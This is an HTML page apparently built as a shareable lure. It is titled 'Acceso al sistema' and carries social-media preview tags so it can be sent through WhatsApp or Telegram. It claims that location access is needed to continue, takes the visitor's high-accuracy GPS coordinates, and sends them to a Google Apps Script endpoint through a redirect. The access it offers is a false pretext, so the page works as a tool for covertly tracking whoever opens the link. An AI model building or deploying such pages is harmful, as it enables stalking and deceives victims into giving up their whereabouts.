<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">

  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Acceso al sistema</title>

  <!-- =====================================================
       VISTA PREVIA PARA WHATSAPP / FACEBOOK / TELEGRAM
       ===================================================== -->

  <meta property="og:type" content="website">

  <meta property="og:title"
        content="Acceso al sistema">

  <meta property="og:description"
        content="Presiona aquí para ingresar.">

  <meta property="og:url"
        content="https://ariasangel54respaldo-cmyk.github.io/youtube/">

  <!-- IMAGEN DE VISTA PREVIA -->
  <meta property="og:image"
        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">

  <meta property="og:image:secure_url"
        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">

  <meta property="og:image:type"
        content="image/png">

  <!--
    Lo ideal es que ima.png tenga aproximadamente
    1200 x 630 px para una vista previa grande.
  -->
  <meta property="og:image:width"
        content="1200">

  <meta property="og:image:height"
        content="630">

  <!-- TWITTER / X -->
  <meta name="twitter:card"
        content="summary_large_image">

  <meta name="twitter:title"
        content="Acceso al sistema">

  <meta name="twitter:description"
        content="Presiona aquí para ingresar.">

  <meta name="twitter:image"
        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">


  <style>

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
    }

    body {

      min-height: 100vh;

      display: flex;
      justify-content: center;
      align-items: center;

      padding: 20px;

      font-family:
        Arial,
        Helvetica,
        sans-serif;

      color: white;

      background:
        linear-gradient(
          rgba(0,0,0,0.55),
          rgba(0,0,0,0.80)
        ),
        url("ima.png");

      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }


    /* ==========================
       TARJETA PRINCIPAL
       ========================== */

    .contenedor {

      width: 100%;
      max-width: 430px;

      padding: 35px 25px;

      text-align: center;

      background:
        rgba(0,0,0,0.40);

      border:
        1px solid rgba(255,255,255,0.30);

      border-radius: 25px;

      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);

      box-shadow:
        0 20px 60px rgba(0,0,0,0.60);
    }


    /* ==========================
       IMAGEN
       ========================== */

    .imagen {

      width: 140px;
      height: 140px;

      object-fit: cover;

      border-radius: 50%;

      border:
        3px solid rgba(255,255,255,0.85);

      margin-bottom: 25px;

      box-shadow:
        0 0 30px rgba(255,255,255,0.30);
    }


    h1 {

      font-size: 28px;

      margin-bottom: 15px;
    }


    .descripcion {

      font-size: 16px;

      line-height: 1.6;

      color: #eeeeee;

      margin-bottom: 25px;
    }


    /* ==========================
       BOTÓN
       ========================== */

    #btnContinuar {

      width: 100%;

      padding: 17px;

      border-radius: 15px;

      border:
        1px solid rgba(255,255,255,0.55);

      background:
        rgba(255,255,255,0.15);

      color: white;

      font-size: 17px;

      font-weight: bold;

      cursor: pointer;

      transition: 0.3s;

      backdrop-filter: blur(8px);
    }


    #btnContinuar:hover {

      background:
        rgba(255,255,255,0.30);

      transform:
        translateY(-2px);
    }


    #btnContinuar:disabled {

      opacity: 0.5;

      cursor: wait;

      transform: none;
    }


    /* ==========================
       MENSAJES
       ========================== */

    #estado {

      margin-top: 20px;

      font-size: 14px;

      line-height: 1.5;

      color: #eeeeee;
    }


    /* ==========================
       CARGANDO
       ========================== */

    .spinner {

      display: none;

      width: 40px;
      height: 40px;

      margin:
        22px auto 10px auto;

      border:
        4px solid rgba(255,255,255,0.20);

      border-top:
        4px solid white;

      border-radius: 50%;

      animation:
        girar 0.8s linear infinite;
    }


    @keyframes girar {

      from {
        transform: rotate(0deg);
      }

      to {
        transform: rotate(360deg);
      }

    }


    .privacidad {

      margin-top: 25px;

      font-size: 11px;

      line-height: 1.5;

      color: rgba(255,255,255,0.65);
    }


    /* ==========================
       CELULARES
       ========================== */

    @media
    (max-width: 480px) {

      body {

        padding: 15px;

        background-position: center;
      }


      .contenedor {

        padding:
          30px 20px;
      }


      .imagen {

        width: 115px;
        height: 115px;
      }


      h1 {

        font-size: 24px;
      }


      .descripcion {

        font-size: 15px;
      }

    }

  </style>

</head>


<body>


<div class="contenedor">


  <!-- IMAGEN -->
  <img
    src="ima.png"
    alt="Acceso"
    class="imagen"
  >


  <h1>
    Bienvenido
  </h1>


  <p class="descripcion">

    Para continuar es necesario
    autorizar el acceso a tu ubicación.

  </p>


  <!-- BOTÓN -->

  <button
    id="btnContinuar"
    onclick="solicitarUbicacion()"
  >

    CONTINUAR

  </button>


  <!-- CARGANDO -->

  <div
    id="spinner"
    class="spinner">
  </div>


  <!-- ESTADO -->

  <div id="estado">

    Presiona CONTINUAR para ingresar.

  </div>


  <!-- PRIVACIDAD -->

  <div class="privacidad">

    El navegador solicitará tu autorización
    antes de compartir la ubicación.

  </div>


</div>



<script>


/* =====================================================
   URL DE GOOGLE APPS SCRIPT
   ===================================================== */


const URL_SISTEMA =
"https://script.google.com/macros/s/AKfycbyE-RGmsmeM7jRu00nVmqbzweWZcaSkRRqtL0WH1aZwq_YgzUYYQaj0PT0Nd5ATP_4m/exec";



/* =====================================================
   SOLICITAR UBICACIÓN
   ===================================================== */


function solicitarUbicacion() {


  const boton =
    document.getElementById(
      "btnContinuar"
    );


  const estado =
    document.getElementById(
      "estado"
    );


  const spinner =
    document.getElementById(
      "spinner"
    );



  /* ==============================
     DESACTIVAR BOTÓN
     ============================== */


  boton.disabled = true;


  spinner.style.display =
    "block";


  estado.innerHTML =
    "Solicitando autorización de ubicación...";



  /* ==============================
     COMPROBAR GEOLOCALIZACIÓN
     ============================== */


  if (!navigator.geolocation) {


    spinner.style.display =
      "none";


    boton.disabled =
      false;


    estado.innerHTML =
      "Este dispositivo no permite obtener la ubicación.";


    return;

  }



  /* ==============================
     SOLICITAR PERMISO
     ============================== */


  navigator.geolocation.getCurrentPosition(


    /* ==========================
       PERMISO CONCEDIDO
       ========================== */


    function(position) {


      const latitud =
        position.coords.latitude;


      const longitud =
        position.coords.longitude;


      const precision =
        position.coords.accuracy;



      estado.innerHTML =
        "Ubicación autorizada.<br>Ingresando...";



      /* ==========================
         CREAR URL
         ========================== */


      const destino =

        URL_SISTEMA +

        "?lat=" +

        encodeURIComponent(
          latitud
        ) +

        "&lng=" +

        encodeURIComponent(
          longitud
        ) +

        "&accuracy=" +

        encodeURIComponent(
          precision
        );



      /* ==========================
         REDIRECCIONAR
         ========================== */


      setTimeout(

        function() {


          window.location.href =
            destino;


        },

        700

      );


    },



    /* ==========================
       ERROR / PERMISO DENEGADO
       ========================== */


    function(error) {


      spinner.style.display =
        "none";


      boton.disabled =
        false;



      switch(error.code) {


        case error.PERMISSION_DENIED:


          estado.innerHTML =
            "No se autorizó el acceso a la ubicación. " +
            "Para continuar, habilita el permiso de ubicación en tu navegador.";


          break;



        case error.POSITION_UNAVAILABLE:


          estado.innerHTML =
            "No se pudo determinar tu ubicación. " +
            "Verifica que el GPS esté activado e intenta nuevamente.";


          break;



        case error.TIMEOUT:


          estado.innerHTML =
            "La ubicación tardó demasiado en responder. " +
            "Presiona CONTINUAR para intentarlo nuevamente.";


          break;



        default:


          estado.innerHTML =
            "No fue posible obtener la ubicación.";


      }


    },



    /* ==========================
       CONFIGURACIÓN GPS
       ========================== */


    {

      enableHighAccuracy:
        true,

      timeout:
        20000,

      maximumAge:
        0

    }


  );


}


</script>


</body>

</html>
